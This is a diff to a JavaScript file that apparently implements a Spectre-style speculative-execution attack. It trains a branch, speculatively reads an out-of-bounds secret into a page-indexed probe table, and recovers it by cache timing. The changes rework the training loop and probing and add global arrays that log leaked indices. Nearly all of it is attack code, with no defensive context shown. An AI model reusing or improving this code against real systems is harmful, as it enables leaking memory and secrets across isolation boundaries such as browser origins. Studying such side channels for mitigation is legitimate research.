@@ -35,7 +35,7 @@ export default
         const indicator_table = new IndicatorTable(probe_length);
         
         let total_iterations = 0;
-        for (var i = 0; i < min_iterations; ++total_iterations) {
+        for (var i = 0; i < min_iterations || time_tables.length; ++total_iterations) {
             if (!time_tables.length) {
                 _speculativelyReadAddress();
             }
@@ -73,9 +73,17 @@ export default
             }
         }
         const mean_time = mean(mean_times);
+        if (max_indicator_index !== undefined) {
+            globalThis.w = globalThis.w || [];
+            globalThis.w.push(max_indicator_index);
+        }
         if (i < min_iterations) {
             max_indicator_index = undefined;
             // console.warn("index test failed");
+        }
+        if (max_indicator_index !== undefined) {
+            globalThis.w2 = globalThis.w2 || [];
+            globalThis.w2.push(max_indicator_index);
         }
         // prepare results
         let second_indicator = -Infinity;
@@ -112,20 +120,21 @@ export default
         }
         
         function _speculativelyReadAddress() {
-            const probe_table = new Uint8Array((1 + probe_length) * page_size);
             // run the speculative execution at least twice
             // the first run causes secret_table[fixed_index] to be loaded from RAM (cache miss)
             // this means that the speculative branch takes long to execute and thus is likely to get caught by the branch rollback
             // the second time that the speculative execution runs, secret_table[fixed_index] is already cached and therefore fast
-            for (let j = 0; j < speculative_repetitions; ++j) {
-                const delay_array = new Uint8Array(2 * page_size);
-                for (let i = training_number; i > 0; --i) {
+            // for (let j = 0; j < speculative_repetitions; ++j) {
+                // const probe_table = new Uint8Array((1 + probe_length) * page_size);
+                // const delay_array = new Uint8Array(2 * page_size);
+                let first = true;
+                for (let i = 0; i < training_number * speculative_repetitions; ++i) {
+                    const probe_table = new Uint8Array((1 + probe_length) * page_size);
+                    const delay_array = new Uint8Array(2 * page_size);
                     // helper variables to optimize assembly code
-                    const invalid_access = (i == 1) | 0;
+                    const invalid_access = !((i + 1) % training_number) | 0;
                     const fixed_address = address * invalid_access;
                     const fixed_page_size = page_size * invalid_access;
-                    // if (invalid_access) {
-                    // }
                     // ensure evaluation before jump condition
                     // load probe_table[0] to cache the probe_table address
                     junk ^= fixed_address | fixed_page_size | probe_table[0];
@@ -136,10 +145,17 @@ export default
                         // map invalid accesses to their respective probe boxes
                         junk ^= probe_table[(1 + secret_value) * fixed_page_size & 0xffffff];
                     }
+                    if (invalid_access) {
+                        if (!first) {
+                            probeTable(probe_table);
+                        } else {
+                            first = false;
+                        }
+                    } 
                 }
-            }
+            // }
             // probe table
-            probeTable(probe_table);
+            // probeTable(probe_table);
         }
     }
 })();
